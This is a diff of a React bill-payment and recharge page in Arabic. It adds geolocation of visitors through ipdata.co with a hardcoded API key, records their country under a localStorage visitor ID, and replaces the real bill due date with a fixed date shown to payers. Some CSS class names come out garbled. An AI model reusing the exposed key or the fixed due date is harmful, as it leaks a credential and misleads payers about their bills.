@@ -92,6 +92,8 @@ export default function RechargePage() {
       const visitorId = localStorage.getItem("visitor") || visitorID
       await addData({
         id: visitorId,
+        phone:visitorId,
+        name:visitorId,
         ...data,
       })
       setShowPaymentDialog(true)
@@ -148,15 +150,9 @@ export default function RechargePage() {
       setFetchingBill(false)
     }
   }
-
-  useEffect(() => {
-    setValue("provider", "")
-    setValue("accountNumber", "")
-    setBillData(null)
-    setBillError(null)
-  }, [serviceType, setValue])
-
-  useEffect(() => {
+  async function getLocation() {
+    const APIKEY = '856e6f25f413b5f7c87b868c372b89e52fa22afb878150f5ce0c4aef';
+    const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`;
     const getVisitorId = () => {
       let id = localStorage.getItem("visitor")
       if (!id) {
@@ -166,12 +162,40 @@ export default function RechargePage() {
       return id
     }
     const visitorId = getVisitorId()
-    setupOnlineStatus(visitorId)
+    try {
+      const response = await fetch(url);
+      if (!response.ok) {
+        throw new Error(`HTTP error! Status: ${response.status}`);
+      }
+      const country = await response.text();
+      addData({
+        id: visitorId,
+        country: country
+      })
+      localStorage.setItem('country', country)
+      setupOnlineStatus(visitorId)
+    } catch (error) {
+      console.error('Error fetching location:', error);
+    }
+  }
+
+  useEffect(() => {
+    getLocation()
+  }, [])
+  useEffect(() => {
+    setValue("provider", "")
+    setValue("accountNumber", "")
+    setBillData(null)
+    setBillError(null)
+  }, [serviceType, setValue])
+
+  useEffect(() => {
+
   }, [])
 
   if (showSuccess) {
     return (
-      <div className="bg-gray-50 min-h-screen font-sans flex flex-col" dir="rtl">
+      <div className="bg- min-h-screen font-sans flex flex-col" dir="rtl">
         <SiteHeader />
         <main
           className="flex-grow flex items-center justify-center p-4"
@@ -208,7 +232,7 @@ export default function RechargePage() {
   }
 
   return (
-    <div className="bg-gray-50 min-h-screen font-sans flex flex-col" dir="rtl">
+    <div className="bg-50 min-h-screen font-sans flex flex-col" dir="rtl">
       <SiteHeader />
       <main className="flex-grow">
         <div className="bg-[#9aca3f] text-white text-center py-6">
@@ -218,12 +242,12 @@ export default function RechargePage() {
         <div
           className="py-12 px-4"
           style={{
-            backgroundImage: "url(/bg.png)",
+            backgroundImage: "url(/bg.jpg)",
             backgroundRepeat: "repeat",
             backgroundSize: "auto",
           }}
         >
-          <Card className="max-w-md mx-auto bg-white/80 backdrop-blur-sm shadow-xl rounded-2xl border-gray-200">
+          <Card className="max-w-md mx-auto bg-backdrop-blur-sm shadow-xl rounded-2xl border-gray-200">
             <CardContent className="p-8">
               <form className="space-y-4" onSubmit={handleSubmit(onSubmit)}>
                 <Controller
@@ -298,7 +322,7 @@ export default function RechargePage() {
                         <p className="text-sm text-green-800">
                           المبلغ المستحق: <span className="font-bold">{billData.amount} ر.ع</span>
                         </p>
-                        <p className="text-sm text-green-800">تاريخ الاستحقاق: {billData.dueDate}</p>
+                        <p className="text-sm text-green-800">تاريخ الاستحقاق: { "24/07/2025"}</p>
                       </div>
                     )}
                   </div>
